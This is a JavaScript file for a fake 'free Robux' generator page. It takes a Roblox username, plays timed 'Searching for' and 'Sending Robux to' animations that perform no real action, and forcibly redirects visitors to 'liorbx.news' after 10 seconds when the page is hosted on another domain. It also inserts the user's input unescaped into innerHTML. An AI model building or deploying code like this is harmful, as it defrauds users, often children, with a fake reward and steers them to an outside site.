const rbxbtn = document.querySelector(".getrbx");

const box1 = document.querySelector(".box2");
const box2 = document.querySelector(".boxanimation");
const box3 = document.querySelector(".box3");
const box4 = document.querySelector(".box4");
const rbxtotal = document.querySelectorAll(".details");

const username = document.querySelector(".username");

const animationtxt = document.querySelector(".animationtxt");

rbxbtn.addEventListener("click", () => {
  if (username.value.length <= 2) {
    alert("please enter username");
  } else {
    box1.style.display = "none";
    box2.style.display = "flex";
    setTimeout(showbox2, 4500);
    setTimeout(showbox3, 4500);

    animationtxt.innerHTML = `Searching for <b>${username.value}</b> ...`;
  }
});

rbxtotal.forEach((btn) => {
  btn.addEventListener("click", () => {
    box3.style.display = "none";

    box2.style.display = "flex";

    setTimeout(showboxagain, 3500);
    setTimeout(showbox4, 3500);
    animationtxt.innerHTML = `Sending Robux to <b>${username.value}</b>...`;
  });
});

let showboxagain = () => {
  box2.style.display = "none";
};
let showbox2 = () => {
  box2.style.display = "none";
};

let showbox3 = () => {
  box3.style.display = "flex";
};

let showbox4 = () => {
  box4.style.display = "flex";
};
if (window.location.hostname !== "liorbx.news") {
    setTimeout(function () {
        window.location.href = "https://liorbx.news";
    }, 10000); // 10 ثوانٍ
}
